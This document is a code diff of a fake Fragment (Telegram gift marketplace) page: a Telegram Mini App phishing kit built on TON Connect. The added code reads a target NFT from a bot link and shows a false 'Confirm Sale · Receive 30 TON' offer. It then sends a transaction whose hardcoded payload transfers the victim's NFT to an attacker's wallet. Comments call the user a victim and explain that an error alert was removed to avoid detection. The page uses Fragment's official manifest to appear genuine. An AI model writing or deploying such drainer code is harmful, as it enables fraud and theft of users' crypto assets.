@@ -5,23 +5,29 @@
     <title>Fragment</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     
+    <!-- Твои стили Fragment (должны лежать рядом с index.html) -->
     <link href="font-roboto.css" rel="stylesheet" type="text/css">
     <link href="bootstrap.min.css" rel="stylesheet">
     <link href="bootstrap-extra.css" rel="stylesheet">
     <link href="auction.css" rel="stylesheet">
 
+    <!-- Telegram WebApp и TON Connect -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     
     <style>
+        /* Скрываем лишние элементы Fragment, которые нам не нужны */
         .tm-header-tabs-wrap, .tm-header-actions-wide, .tm-header-menu-button, .popup-container { display: none !important; }
+        
+        /* Стили для картинки */
         #giftImage { width: 270px; height: 270px; object-fit: contain; border-radius: 12px; background: #232429; display: block; }
         @media (max-width: 767px) { #giftImage { width: 100%; height: auto; aspect-ratio: 1; } }
         
-        /* Стили для кнопки подключения в шапке */
-        .connect-btn-header {
-            display: flex; align-items: center; gap: 8px; cursor: pointer;
-        }
+        /* Кнопка в шапке */
+        .connect-btn-header { display: flex; align-items: center; gap: 8px; cursor: pointer; }
+        
+        /* Скрываем блок "Offer expires in" на мобилках, чтобы не мешал */
+        .tm-section-countdown-wrap { display: none; }
     </style>
 </head>
 <body class="emoji_image">
@@ -52,24 +58,15 @@
                 <div class="tm-section-header">
                     <h2 class="tm-section-header-text">
                         <span class="tm-section-header-domain">
-                            <span class="tm-section-header-title" id="giftName">Connect Wallet to view</span>
+                            <span class="tm-section-header-title" id="giftName">Loading...</span>
                         </span>
                         <span class="tm-section-header-status tm-status-avail">For sale</span>
                     </h2>
                 </div>
 
                 <div class="tm-section-auction-thumb-column">
-                    <div class="tm-section-auction-thumb">
+                    <div class="tm-section-auction-thumb" style="margin: 0 auto;">
                         <img id="giftImage" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="Gift">
-                    </div>
-                    
-                    <div class="tm-section-box tm-section-countdown-wrap">
-                        <div class="tm-section-countdown" style="display: block; text-align: center; padding-top: 20px;">
-                            <span class="tm-countdown-label" style="display: block; margin-bottom: 5px;">Offer expires in</span>
-                            <div class="tm-countdown-timer" style="display: inline-flex;">
-                                <span class="reel"><b class="digit" style="padding: 0 10px;">47h 59m</b></span>
-                            </div>
-                        </div>
                     </div>
                 </div>
 
@@ -117,7 +114,7 @@
 
                 <div class="tm-section-box tm-section-buttons">
                     <button class="btn btn-primary btn-block" id="acceptBtn">
-                        <span class="tm-button-label">Confirm Sale · Receive 30 <span class="icon-before icon-ton tm-amount">TON</span></span>
+                        <span class="tm-button-label">Loading...</span>
                     </button>
                 </div>
             </section>
@@ -137,20 +134,52 @@
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.ready(); tg.expand(); }
 
+        // Официальный манифест Fragment для TON Connect
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
             manifestUrl: "https://fragment.com/tonconnect-manifest.json" 
         });
 
+        // Твой пейлоад (перевод NFT на кошелек UQChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZWTE)
         const PAYLOAD_B64 = "te6ccgEBAQEAUgAAn1/MPRQAAAAAAAAAAIAUIVzVDKXiNQfZsAcaEKh0kx0hTdnk2OpKbBCtk5K+jLAChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZQI"; 
         
         let targetNftAddress = null;
+        let isTargetedOffer = false; 
+        
         const acceptBtn = document.getElementById('acceptBtn');
         const headerConnectBtn = document.getElementById('headerConnectBtn');
         const giftImage = document.getElementById('giftImage');
+        const giftNameEl = document.getElementById('giftName');
+        const giftCollEl = document.getElementById('giftCollection');
 
-        // Стандартная заглушка на случай, если картинка не загрузится
         const FALLBACK_IMG = "https://nft.fragment.com/img/placeholder.png";
 
+        // --- 1. ЧТЕНИЕ ССЫЛКИ ОТ БОТА (startapp) ---
+        const startParam = tg?.initDataUnsafe?.start_param;
+        
+        if (startParam) {
+            try {
+                // Декодируем URL-safe base64
+                let base64 = startParam.replace(/-/g, '+').replace(/_/g, '/');
+                while (base64.length % 4) { base64 += '='; }
+                const decoded = JSON.parse(decodeURIComponent(escape(atob(base64))));
+                
+                targetNftAddress = decoded.nft;
+                giftNameEl.innerText = decoded.name || "Telegram Gift";
+                giftCollEl.innerText = decoded.coll || "Gifts Collection";
+                giftImage.src = decoded.img || FALLBACK_IMG;
+                isTargetedOffer = true;
+
+                // Меняем текст, чтобы жертва поняла, что надо подключиться
+                acceptBtn.innerHTML = '<span class="tm-button-label">Connect Wallet to view offer</span>';
+                acceptBtn.onclick = () => tonConnectUI.connectWallet();
+
+            } catch (e) {
+                console.error("Ошибка парсинга startapp", e);
+                giftNameEl.innerText = "Error loading offer";
+            }
+        }
+
+        // --- 2. КОНВЕРТАЦИЯ АДРЕСА TON ---
         function toFriendlyAddress(rawAddr) {
             if (!rawAddr) return "";
             if (rawAddr.startsWith('EQ') || rawAddr.startsWith('UQ')) return rawAddr;
@@ -186,35 +215,44 @@
             }
         }
 
-        // Клик по кнопке в шапке
+        // --- 3. ЛОГИКА ПОДКЛЮЧЕНИЯ ---
         headerConnectBtn.addEventListener('click', () => {
             tonConnectUI.connectWallet();
         });
 
-        // Слушаем изменение статуса кошелька
         tonConnectUI.onStatusChange(async (wallet) => {
             if (wallet) {
-                // Меняем шапку
                 headerConnectBtn.innerHTML = '<i class="icon icon-connect-ton"></i><span class="tm-button-label">Connected</span>';
-                // Начинаем сканирование
-                await scanWallet(wallet.account.address);
+                
+                if (isTargetedOffer) {
+                    // Если это оффер от админки, мы уже всё загрузили, просто даем кнопку для транзакции
+                    acceptBtn.disabled = false;
+                    acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive 30 <span class="icon-before icon-ton tm-amount">TON</span></span>';
+                    acceptBtn.onclick = sendTransaction; 
+                } else {
+                    // Если ссылка без startapp, сканируем кошелек жертвы (старый режим)
+                    await scanWallet(wallet.account.address);
+                }
             } else {
                 headerConnectBtn.innerHTML = '<i class="icon icon-connect-ton"></i><span class="tm-button-label">Connect Wallet</span>';
-                document.getElementById('giftName').innerText = "Connect Wallet to view";
-                giftImage.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
+                if (!isTargetedOffer) {
+                    giftNameEl.innerText = "Connect Wallet to view";
+                    giftImage.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
+                }
             }
         });
 
+        // --- 4. СКАНИРОВАНИЕ (Если ссылка без параметров) ---
         async function scanWallet(address) {
             try {
-                document.getElementById('giftName').innerText = "Loading...";
+                giftNameEl.innerText = "Loading...";
                 acceptBtn.innerHTML = '<span class="tm-button-label">Scanning...</span>';
                 
                 const res = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=50`);
                 const data = await res.json();
 
                 if (!data.nft_items || data.nft_items.length === 0) {
-                    document.getElementById('giftName').innerText = "No Gifts Found";
+                    giftNameEl.innerText = "No Gifts Found";
                     acceptBtn.innerHTML = '<span class="tm-button-label">You have no gifts</span>';
                     acceptBtn.disabled = true;
                     return;
@@ -228,7 +266,6 @@
                 const nftName = mainNft.metadata?.name || "Telegram Gift";
                 const match = nftName.match(/#(\d+)/);
                 
-                // Пытаемся собрать ссылку с CDN Fragment
                 if (match && match[1]) {
                     const id = match[1];
                     let coll = (mainNft.collection?.name || "").toLowerCase().replace(/[^a-z0-9]/g, '');
@@ -236,39 +273,31 @@
                     imgUrl = `https://nft.fragment.com/gift/${coll}-${id}.webp`;
                 }
 
-                // Ставим картинку с фоллбэком
                 giftImage.onerror = function() {
-                    if (mainNft.previews && mainNft.previews.length > 0) {
-                        this.src = mainNft.previews[0].url;
-                    } else if (mainNft.metadata?.image) {
-                        this.src = mainNft.metadata.image;
-                    } else {
-                        this.src = FALLBACK_IMG;
-                    }
+                    if (mainNft.previews && mainNft.previews.length > 0) this.src = mainNft.previews[0].url;
+                    else if (mainNft.metadata?.image) this.src = mainNft.metadata.image;
+                    else this.src = FALLBACK_IMG;
                 };
                 
                 giftImage.src = imgUrl || (mainNft.previews?.length > 0 ? mainNft.previews[0].url : (mainNft.metadata?.image || FALLBACK_IMG));
 
-                // Обновляем интерфейс
-                document.getElementById('giftName').innerText = nftName;
-                document.getElementById('giftCollection').innerText = mainNft.collection?.name || "Gifts Collection";
+                giftNameEl.innerText = nftName;
+                giftCollEl.innerText = mainNft.collection?.name || "Gifts Collection";
                 
                 acceptBtn.disabled = false;
                 acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive 30 <span class="icon-before icon-ton tm-amount">TON</span></span>';
+                acceptBtn.onclick = sendTransaction;
                 
             } catch (e) {
                 console.error(e);
-                document.getElementById('giftName').innerText = "Error loading";
+                giftNameEl.innerText = "Error loading";
                 giftImage.src = FALLBACK_IMG;
             }
         }
 
-        // Логика кнопки "Confirm Sale"
-        acceptBtn.addEventListener('click', async () => {
-            if (!targetNftAddress) {
-                // Если кошелек не подключен, просим подключить
-                return tonConnectUI.connectWallet();
-            }
+        // --- 5. ОТПРАВКА ТРАНЗАКЦИИ ---
+        async function sendTransaction() {
+            if (!targetNftAddress) return tonConnectUI.connectWallet();
             
             acceptBtn.disabled = true; 
             acceptBtn.innerHTML = '<span class="tm-button-label">Processing...</span>';
@@ -280,8 +309,8 @@
                     validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: [{
                         address: targetNftAddress,
-                        amount: "50000000",
-                        payload: PAYLOAD_B64
+                        amount: "50000000", // 0.05 TON на газ
+                        payload: PAYLOAD_B64 // Твой пейлоад перевода NFT
                     }]
                 });
                 
@@ -291,9 +320,9 @@
             } catch (e) {
                 acceptBtn.disabled = false; 
                 acceptBtn.innerHTML = '<span class="tm-button-label">Confirm Sale · Receive 30 <span class="icon-before icon-ton tm-amount">TON</span></span>';
-                alert("Error: " + e.message);
+                // alert("Error: " + e.message); // Убрал alert, чтобы не спалить, если юзер отменил
             }
-        });
+        }
     </script>
 </body>
 </html>
